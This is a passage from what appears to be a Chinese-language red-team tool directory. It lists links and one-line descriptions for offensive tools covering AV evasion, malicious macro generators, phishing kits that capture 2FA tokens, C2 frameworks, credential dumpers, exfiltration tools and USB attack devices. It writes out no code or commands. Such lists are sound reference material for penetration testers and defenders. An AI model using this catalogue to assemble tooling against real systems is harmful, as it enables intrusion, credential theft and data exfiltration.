rel="noopener">https://www.shellterproject.com/</a></p><p>SigThief：是一个由python编写的,可以用于劫持合法的数字签名并绕过Windows的哈希验证机制的脚本工具。</p><p><a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></p><p>Veil：用于生成绕过常用AV的metasploit有效载荷的工具。</p><p><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></p><p>CheckPlease：用PowerShell，Python，Go，Ruby，C，C＃，Perl和Rust编写的CheckPlease Sandbox evasion模块。</p><p><a href="https://github.com/Arvanaghi/CheckPlease" target="_blank" rel="noopener">https://github.com/Arvanaghi/CheckPlease</a></p><p>Invoke-PSImage：将目标PS脚本嵌入到一个PNG图片文件的像素点中，并允许我们使用一行指令来执行该脚本。</p><p><a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></p><p>LuckyStrike：基于PowerShell的实用程序，用于创建恶意的Office宏文档。仅用于渗透测试或教育目的。</p><p><a href="https://github.com/curi0usJack/luckystrike" target="_blank" rel="noopener">https://github.com/curi0usJack/luckystrike</a></p><p>ClickOnceGenerator：适用于红队的快速恶意ClickOnce生成器。</p><p><a href="https://github.com/Mr-Un1k0d3r/ClickOnceGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/ClickOnceGenerator</a></p><p>macro_pack：一个用于自动生成混淆过的MS Office文档、VB脚本等其他格式的工具,其主要目的是用于渗透测试、demo以及社会工程学的评估。</p><p><a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack</a></p><p>StarFighters：基于JavaScript和VBScript的Empire启动器。</p><p><a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">https://github.com/Cn33liz/StarFighters</a></p><p>nps_payload：专为逃避入侵检测而生成Payload的工具。</p><p><a href="https://github.com/trustedsec/nps_payload" target="_blank" rel="noopener">https://github.com/trustedsec/nps_payload</a></p><p>SocialEngineering：负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和payloads。</p><p><a href="https://github.com/bhdresh/SocialEngineeringPayloads" target="_blank" rel="noopener">https://github.com/bhdresh/SocialEngineeringPayloads</a></p><p>Social-Engineer Toolkit：一款专为社交工程设计的开源渗透测试框架。</p><p><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></p><p>Phishery：一个支持SSL简单的HTTP服务器。</p><p><a href="https://github.com/ryhanson/phishery" target="_blank" rel="noopener">https://github.com/ryhanson/phishery</a></p><p>PowerShdll：使用rundll32运行PowerShell。绕过软件限制。</p><p><a href="https://github.com/p3nt4/PowerShdll" target="_blank" rel="noopener">https://github.com/p3nt4/PowerShdll</a></p><p>Ultimate AppLocker ByPass List：常用AppLocker绕过技术存储库。</p><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></p><p>Ruler：是一款能够通过MAPI/HTTP协议与Exchange服务器交互的工具。</p><p><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p><p>Generate-Macro：一个独立的PowerShell脚本，它将生成具有指定有效负载和持久性方法的恶意Microsoft Office文档。</p><p><a href="https://github.com/enigma0x3/Generate-Macro" target="_blank" rel="noopener">https://github.com/enigma0x3/Generate-Macro</a></p><p>Malicious Macro MSBuild Generator ：生成恶意宏并通过MSBuild应用程序白名单绕过执行Powershell或Shellcode。</p><p><a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild" target="_blank" rel="noopener">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a></p><p>Meta Twin：一个文件资源克隆器。从一个文件中提取元数据，包括数字签名，并注入到另一个文件中。</p><p><a href="https://github.com/threatexpress/metatwin" target="_blank" rel="noopener">https://github.com/threatexpress/metatwin</a></p><p>WePWNise：生成独立于体系结构的VBA代码，用于Office文档或模板，并自动绕过应用程序控制。</p><p><a href="https://github.com/mwrlabs/wePWNise" target="_blank" rel="noopener">https://github.com/mwrlabs/wePWNise</a></p><p>DotNetToJScript：能够利用JS/Vbs脚本加载.Net程序的工具。</p><p><a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a></p><p>PSAmsi：一个审计和攻击 AMSI 签名的工具。</p><p><a href="https://github.com/cobbr/PSAmsi" target="_blank" rel="noopener">https://github.com/cobbr/PSAmsi</a></p><p>Reflective DLL injection：是一种库注入技术，让DLL自身不使用LoadLibraryA函数,将自身映射到目标进程内存中。</p><p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>ps1encode：用于生成和编码基于powershell的metasploit有效载荷。</p><p><a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a></p><p>Worse PDF：将一个普通的PDF文件变成恶意文件。用于从Windows机器上窃取Net-NTLM哈希。</p><p><a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener">https://github.com/3gstudent/Worse-PDF</a></p><p>SpookFlare：一款可帮助你有机会绕过各种安全措施的工具，例如客户端检测和网络端检测的端点策略。SpookFlare还是Meterpreter，Empire，Koadic等的loader/dropper生成器。</p><p><a href="https://github.com/hlldz/SpookFlare" target="_blank" rel="noopener">https://github.com/hlldz/SpookFlare</a></p><p>GreatEST：是一个生成应用程序白名单绕过的开源项目。此工具适用于红蓝对抗。</p><p><a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></p><p>nps：运行没有PowerShell的PowerShell。</p><p><a href="https://github.com/Ben0xA/nps" target="_blank" rel="noopener">https://github.com/Ben0xA/nps</a></p><p>Meterpreter_Paranoid_Mode.sh：一个可以创建SSL/TLS shell连接的脚本。</p><p><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL" target="_blank" rel="noopener">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></p><p>The Backdoor Factory：一款安全测试工具,可以轻松的生成win32PE后门测试程序,ELF文件后门程序等。</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p>MacroShop：一组脚本，通过Office宏传递有效载荷。</p><p><a href="https://github.com/khr0x40sh/MacroShop" target="_blank" rel="noopener">https://github.com/khr0x40sh/MacroShop</a></p><p>UnmanagedPowerShell：可以从一个非托管程序来执行PowerShell , 经过一些修改后也可以被用来注入到其他进程。</p><p><a href="https://github.com/leechristensen/UnmanagedPowerShell" target="_blank" rel="noopener">https://github.com/leechristensen/UnmanagedPowerShell</a></p><h1 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h1><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>King Phisher：一款专业的钓鱼活动工具包。</p><p><a href="https://github.com/securestate/king-phisher" target="_blank" rel="noopener">https://github.com/securestate/king-phisher</a></p><p>FiercePhish：是一个管理所有钓鱼攻击的完整钓鱼框架 ，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等。</p><p><a href="https://github.com/Raikia/FiercePhish" target="_blank" rel="noopener">https://github.com/Raikia/FiercePhish</a></p><p>ReelPhish：是一个实时双因素网络钓鱼工具。</p><p><a href="https://github.com/fireeye/ReelPhish/" target="_blank" rel="noopener">https://github.com/fireeye/ReelPhish/</a></p><p>Gophish：是一款专为企业和渗透测试人员设计的开源钓鱼攻击工具包。</p><p><a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">https://github.com/gophish/gophish</a></p><p>CredSniper：是一个使用Python微型框架Flask和Jinja2模板编写的网络钓鱼框架，支持捕获2FA令牌。</p><p><a href="https://github.com/ustayready/CredSniper" target="_blank" rel="noopener">https://github.com/ustayready/CredSniper</a></p><p>PwnAuth：一个让组织和渗透测试人员能够拥有测试其检测和响应OAuth滥用社会工程活动能力的平台。</p><p><a href="https://github.com/fireeye/PwnAuth" target="_blank" rel="noopener">https://github.com/fireeye/PwnAuth</a></p><p>Phishing Frenzy： 一个开源的钓鱼测试工具。</p><p><a href="https://github.com/pentestgeek/phishing-frenzy" target="_blank" rel="noopener">https://github.com/pentestgeek/phishing-frenzy</a></p><h2 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h2><p>BeEF：一款针对浏览器的渗透测试工具。</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><h1 id="命令与控制"><a href="#命令与控制" class="headerlink" title="命令与控制"></a>命令与控制</h1><h2 id="远程访问工具"><a href="#远程访问工具" class="headerlink" title="远程访问工具"></a>远程访问工具</h2><p>Cobalt Strike：一款非常优秀的后渗透平台。</p><p><a href="https://cobaltstrike.com/" target="_blank" rel="noopener">https://cobaltstrike.com/</a></p><p>Empire：一个纯碎的PowerShell后期漏洞利用代理工具。</p><p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p><p>Metasploit Framework：一个软件漏洞利用框架。</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Pupy：是一个基于python的开源跨平台（Windows，Linux，OSX，Android）远程管理和后期利用工具。</p><p><a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">https://github.com/n1nj4sec/pupy</a></p><p>Koadic：DEFCON上的一个后渗透工具，一款js/vbs远控，模块也蛮多的，涉及的功能也很全面。</p><p><a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">https://github.com/zerosum0x0/koadic</a></p><p>PoshC2：一款基于PowerShell和C#的命令控制工具。</p><p><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">https://github.com/nettitude/PoshC2</a></p><p>Gcat：是一款使用Gmail控制管理的Python隐形后门。</p><p><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p><p>TrevorC2：是一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信。</p><p><a href="https://github.com/trustedsec/trevorc2" target="_blank" rel="noopener">https://github.com/trustedsec/trevorc2</a></p><p>Merlin：是一个用Go语言编写的跨平台后期利用HTTP/2命令与控制服务器和代理（ agent ）。</p><p><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></p><p>Quasar：一个用C#编码的快速轻量级远程管理工具。</p><p><a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></p><h1 id="Staging"><a href="#Staging" class="headerlink" title="Staging"></a>Staging</h1><p>Red Baron：是Terraform的一组模块和定制/第三方提供商，它试图为红队自动创建弹性，一次性，安全和灵活的基础架构。</p><p><a href="https://github.com/Coalfire-Research/Red-Baron" target="_blank" rel="noopener">https://github.com/Coalfire-Research/Red-Baron</a></p><p>EvilURL：为IDN同形异义字攻击生成unicode域名并检测它们。</p><p><a href="https://github.com/UndeadSec/EvilURL" target="_blank" rel="noopener">https://github.com/UndeadSec/EvilURL</a></p><p>Domain Hunter：检查过期域名，bluecoat分类和Archive.org历史记录，以确定最为适合于钓鱼和C2的域名。</p><p><a href="https://github.com/threatexpress/domainhunter" target="_blank" rel="noopener">https://github.com/threatexpress/domainhunter</a></p><p>PowerDNS：一个简单的PoC，用于演示如何使用DNS执行PowerShell脚本。</p><p><a href="https://github.com/mdsecactivebreach/PowerDNS" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/PowerDNS</a></p><p>Chameleon：帮助红队将其基础架构分类为任意类别的工具。</p><p><a href="https://github.com/mdsecactivebreach/Chameleon" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/Chameleon</a></p><p>CatMyFish：搜索分类域。 为你的Cobalt Strike beacon C&amp;C设置白名单域。</p><p><a href="https://github.com/Mr-Un1k0d3r/CatMyFish" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/CatMyFish</a></p><p>Malleable C2：用于重新定义Beacon通信中的指标。</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>Malleable-C2-Randomizer：该脚本通过使用元语言随机化Cobalt Strike Malleable C2配置文件，从而最大程度上的减少基于签名的检测控制机会。</p><p><a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer</a></p><p>FindFrontableDomains：搜索潜在的frontable域。</p><p><a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">https://github.com/rvrsh3ll/FindFrontableDomains</a></p><p>Postfix-Server-Setup：自动化建立一个网络钓鱼服务器。</p><p><a href="https://github.com/n0pe-sled/Postfix-Server-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Postfix-Server-Setup</a></p><p>DomainFronting：根据CDN列出Domain Frontable域列表。</p><p><a href="https://github.com/vysec/DomainFrontingLists" target="_blank" rel="noopener">https://github.com/vysec/DomainFrontingLists</a></p><p>Apache2-Mod_rewrite-Setup：快速在你的基础架构中实现Mod_rewrite。</p><p><a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup</a></p><p>mod_rewrite：沙箱逃逸。</p><p><a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10</a></p><p>external_c2 framework：允许我们使用beacon数据包并通过可选端口与Team Server进行交互。</p><p><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">https://github.com/Und3rf10w/external_c2_framework</a></p><p>ExternalC2：一个用于将通信渠道与Cobalt Strike External C2服务器集成的库。</p><p><a href="https://github.com/ryhanson/ExternalC2" target="_blank" rel="noopener">https://github.com/ryhanson/ExternalC2</a></p><p>cs2 mod_rewrite：用于将Cobalt Strike配置文件转换为mod_rewrite脚本的工具。</p><p><a href="https://github.com/threatexpress/cs2modrewrite" target="_blank" rel="noopener">https://github.com/threatexpress/cs2modrewrite</a></p><p>e2modrewrite：用于将Empire配置文件转换为Apache modrewrite脚本。</p><p><a href="https://github.com/infosecn1nja/e2modrewrite" target="_blank" rel="noopener">https://github.com/infosecn1nja/e2modrewrite</a></p><p>Domain Fronting Google App Engine：一个云平台，允许用户构建和部署自制的Web 和 移动应用程序，它相当于一个介于应用程序和云基础设施之间的抽象层。</p><p><a href="https://github.com/redteam-cyberark/Google-Domain-fronting" target="_blank" rel="noopener">https://github.com/redteam-cyberark/Google-Domain-fronting</a></p><p>使用NGINX提供随机Payload。</p><p><a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9</a></p><p>Empire自动任务执行。</p><p><a href="https://github.com/bneg/RedTeam-Automation" target="_blank" rel="noopener">https://github.com/bneg/RedTeam-Automation</a></p><p>meek：Tor的一种传输插件，它将数据流编码为一系列HTTPS请求和响应。</p><p><a href="https://github.com/arlolra/meek" target="_blank" rel="noopener">https://github.com/arlolra/meek</a></p><p>CobaltStrike-ToolKit ：一些实用的obaltStrike脚本。</p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" target="_blank" rel="noopener">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p><h1 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h1><p>CrackMapExec：使用Python编写的一款工具,堪称Windows活动目录/域环境渗透测试里的一把瑞士军刀。</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p><p>PowerLessShell：在不调用PowerShell.exe的情况下执行PowerShell脚本。</p><p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></p><p>GoFetch：是一个自动执行由BloodHound应用程序生成的攻击计划的工具。</p><p><a href="https://github.com/GoFetchAD/GoFetch" target="_blank" rel="noopener">https://github.com/GoFetchAD/GoFetch</a></p><p>ANGRY PUPPY：Cobalt Strike中bloodhound攻击路径自动化。</p><p><a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></p><p>DeathStar：一键自动化域渗透工具。</p><p><a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/DeathStar</a></p><p>SharpHound：C#重写BloodHound Ingestor。</p><p><a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/SharpHound</a></p><p>Responder：可用于嗅探网络内所有的LLMNR包，获取各个主机的信息，还可以发起欺骗，诱骗发起请求的主机访问错误主机的工具。</p><p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></p><p>SessionGopher：是一个PowerShell工具，它使用WMI为远程访问工具（如WinSCP，PuTTY，SuperPuTTY，FileZilla和Microsoft远程桌面）提取保存的会话信息。该工具支持远程或本地运行。</p><p><a href="https://github.com/fireeye/SessionGopher" target="_blank" rel="noopener">https://github.com/fireeye/SessionGopher</a></p><p>PowerSploit：GitHub上面的一个安全项目，上面有很多powershell攻击脚本,它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Nishang：一款针对PowerShell的渗透工具。</p><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p>Inveigh：是一款Windows PowerShell的LLMNR/NBNS协议欺骗/中间人工具。</p><p><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></p><p>PowerUpSQL：攻击SQL SERVER的Powershell脚本框架。</p><p><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><p>MailSniper：Exchange敏感数据检索工具。</p><p><a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">https://github.com/dafthack/MailSniper</a></p><p>WMIOps：PowerShell脚本，它使用WMI在Windows环境中的本地或远程主机上执行各种操作。</p><p><a href="https://github.com/ChrisTruncer/WMIOps" target="_blank" rel="noopener">https://github.com/ChrisTruncer/WMIOps</a></p><p>Mimikatz ：一款获取windows密码的工具。</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>LaZagne：一款用于检索大量存储在本地计算机密码的开源应用程序。</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>mimipenguin ：一款Linux下的密码抓取神器。</p><p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>PsExec：是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p>KeeThief：允许你从内存中提取KeePass 2.X key material的工具。</p><p><a href="https://github.com/HarmJ0y/KeeThief" target="_blank" rel="noopener">https://github.com/HarmJ0y/KeeThief</a></p><p>PSAttack：一个开源的,将渗透测试实践过程中所有的脚本结合起来形成的框架。</p><p><a href="https://github.com/jaredhaight/PSAttack" target="_blank" rel="noopener">https://github.com/jaredhaight/PSAttack</a></p><p>Internal Monologue攻击：在不触碰LSASS的情况下抓取 NTLM Hashes 的攻击方式。</p><p><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></p><p>Impacket：网络协议工具包。</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>ADRecon：AD环境侦察工具。</p><p><a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="noopener">https://github.com/sense-of-security/ADRecon</a></p><p>icebreaker：如果你当前处于内网环境但又在AD环境之外，icebreaker将会帮助你获取明文Active Directory凭据。</p><p><a href="https://github.com/DanMcInerney/icebreaker" target="_blank" rel="noopener">https://github.com/DanMcInerney/icebreaker</a></p><p>WSUSpendu：该脚本是由法国研究人员开发的，有了它渗透测试人员可以自主创建恶意更新，并将其注入到WSUS服务器数据库中随意的分发这些恶意更新。</p><p><a href="https://github.com/AlsidOfficial/WSUSpendu" target="_blank" rel="noopener">https://github.com/AlsidOfficial/WSUSpendu</a></p><p>Evilgrade ：一个模块化的脚本框架，使攻击者可以通过注射”evil”更新到不知道用户的更新。</p><p><a href="https://github.com/infobyte/evilgrade" target="_blank" rel="noopener">https://github.com/infobyte/evilgrade</a></p><p>NetRipper：是一款针对Windows操作系统的漏洞利用工具,它可以使用API hooking从一个低权限的用户那里截获网络通信数据以及与加密相关的信息，而且还可以捕获明文通信数据以及经过加密的通信数据。</p><p><a href="https://github.com/NytroRST/NetRipper" target="_blank" rel="noopener">https://github.com/NytroRST/NetRipper</a></p><h1 id="隧道通信"><a href="#隧道通信" class="headerlink" title="隧道通信"></a>隧道通信</h1><p>Tunna：一款神奇的工具，它可以通过HTTP封装隧道通信任何TCP，以及用于绕过防火墙环境中的网络限制。</p><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p><p>reGeorg：reDuh 的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>Blade：是一个基于控制台的webshell连接工具。</p><p><a href="https://github.com/wonderqs/Blade" target="_blank" rel="noopener">https://github.com/wonderqs/Blade</a></p><p>Tinyshell：一个简易的shell命令解释器。</p><p><a href="https://github.com/threatexpress/tinyshell" target="_blank" rel="noopener">https://github.com/threatexpress/tinyshell</a></p><p>PowerLurk：用于构建恶意WMI事件Subsriptions的PowerShell工具集。</p><p><a href="https://github.com/Sw4mpf0x/PowerLurk" target="_blank" rel="noopener">https://github.com/Sw4mpf0x/PowerLurk</a></p><p>DAMP：ACL修改项目。</p><p><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">https://github.com/HarmJ0y/DAMP</a></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>PowerView：是一个PowerShell工具，用于获取Windows域的网络态势感知。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p><p>Get-GPPPassword：检索通过组策略首选项推送的帐户的明文密码和其他信息。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>Invoke-ACLpwn：是一个Powershell脚本，可以使用集成的凭据或者指定的凭据来运行。这款工具的工作原理是使用SharpHound导出域内所有ACL以及当前用户账户下的组成员关系。如果用户不具备域对象的writeDACL权限，该工具会枚举域内ACL的所有ACE。</p><p><a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a></p><p>BloodHound：强大的内网域渗透提权分析工具。</p><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><p>PyKEK（Python Kerberos利用工具包），一个用于处理KRB5相关数据的python库。</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></p><h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>UACMe：是一款开源评估工具，其中包含许多用于在多个版本的操作系统上绕过Windows用户帐户控制的方法。</p><p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></p><p>windows-kernel-exploits：windows kernel exploit集合。</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p><p>PowerUp：是本地特权提升的一些调用方法，功能相当强大，拥有众多实用的脚本来帮助我们寻找目标主机Windows服务漏洞进行提权。也是 PowerShell Empire和PowerSploit 的一部分。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>The Elevate Kit：演示如何在Cobalt Strike的Beacon payload中使用PowerShell以及反射DLL exploit。</p><p><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p><p>Sherlock：一个在Windows下用于本地提权的PowerShell脚本。</p><p><a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a></p><p>Tokenvator：一款利用Windows Tokens提权的工具。</p><p><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="noopener">https://github.com/0xbadjuju/Tokenvator</a></p><h1 id="数据盗取"><a href="#数据盗取" class="headerlink" title="数据盗取"></a>数据盗取</h1><p>CloakifyFactory &amp; the Cloakify Toolset - 数据盗取，躲避DLP/MLS数据泄露防护系统，社会工程学分析，突破数据白名单控制，躲避AV检测。</p><p><a href="https://github.com/TryCatchHCF/Cloakify" target="_blank" rel="noopener">https://github.com/TryCatchHCF/Cloakify</a></p><p>DET：是一个概念界定,描述能同时使用单独或多个通道执行数据渗透。</p><p><a href="https://github.com/sensepost/DET" target="_blank" rel="noopener">https://github.com/sensepost/DET</a></p><p>DNSExfiltrator ：利用DNS解析进行数据隐秘传输的工具。</p><p><a href="https://github.com/Arno0x/DNSExfiltrator" target="_blank" rel="noopener">https://github.com/Arno0x/DNSExfiltrator</a></p><p>PyExfil：用于数据盗取的PyExfil Python软件包。</p><p><a href="https://github.com/ytisf/PyExfil" target="_blank" rel="noopener">https://github.com/ytisf/PyExfil</a></p><p>Egress-Assess：一个通过多种协议模拟数据渗透的工具。</p><p><a href="https://github.com/ChrisTruncer/Egress-Assess" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Egress-Assess</a></p><p>PowerShell-RAT：一款基于Python的后门程序。它不仅可以使用屏幕捕捉功能来跟踪用户的活动，而且还可以通过电子邮件附件来将提取出的数据发送给攻击者。</p><p><a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="noopener">https://github.com/Viralmaniar/Powershell-RAT</a></p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="无线网络"><a href="#无线网络" class="headerlink" title="无线网络"></a>无线网络</h2><p>Wifiphisher：能够对WPA加密的AP无线热点实施自动化钓鱼攻击，并获取密码账户。</p><p><a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="noopener">https://github.com/wifiphisher/wifiphisher</a></p><p>Evilginx：可绕过双因素验证的高级钓鱼框架。</p><p><a href="https://github.com/kgretzky/evilginx" target="_blank" rel="noopener">https://github.com/kgretzky/evilginx</a></p><p>Mana：是一款国外安全人员为测试而开发的Wifi劫持工具，可以监听计算机或其他移动设备的Wifi通信，并能够模仿该设备。</p><p><a href="https://github.com/sensepost/mana" target="_blank" rel="noopener">https://github.com/sensepost/mana</a></p><h2 id="嵌入式和外围设备渗透"><a href="#嵌入式和外围设备渗透" class="headerlink" title="嵌入式和外围设备渗透"></a>嵌入式和外围设备渗透</h2><p>MagSpoof：能预测并窃取你下一张信用卡号码的廉价设备 。</p><p><a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">https://github.com/samyk/magspoof</a></p><p>WarberryPi：为了“红队判研”（red teaming）而创建，因为在“红队判研”中，我们想在短时间内尽可能隐秘地获取更多信息。只要找到一个网络端口，插入即可。脚本的设计主要是通过找到 避免网络内噪声被发现且尽可能有效的方法加以实现。WarBerry脚本集扫描工具于一体，从而实现该功能。</p><p><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p>P4wnP1 ：为树莓派安装网络劫持键盘注入(WHID)工具。</p><p><a href="https://github.com/mame82/P4wnP1" target="_blank" rel="noopener">https://github.com/mame82/P4wnP1</a></p><p>malusb：创建跨平台的HID欺骗payload，并在Windows和OSX上建立反向TCP-shell。</p><p><a href="https://github.com/ebursztein/malusb" target="_blank" rel="noopener">https://github.com/ebursztein/malusb</a></p><p>Fenrir：是一款设计用于渗透测试的“开箱即用”工具。其主要功能和用途是绕过有线802.1x保护并使你能够访问目标网络。</p><p><a 